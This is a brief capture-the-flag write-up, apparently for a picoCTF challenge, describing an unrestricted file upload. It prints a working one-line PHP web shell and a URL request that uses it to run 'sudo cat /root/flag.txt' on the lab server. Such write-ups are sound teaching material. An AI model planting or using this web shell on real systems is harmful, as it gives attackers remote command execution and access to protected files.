# n0s4n1ty1

The server doesn't validate the uploaded file.
So, I uploaded the php file.
```php
<?php
        echo shell_exec($_GET['cmd']);
?>
```

After uploading, I could execute shell commands.
```
http://standard-pizzas.picoctf.net:55528/uploads/cmd.php?cmd=sudo%20cat%20%2Froot%2Fflag.txt
```
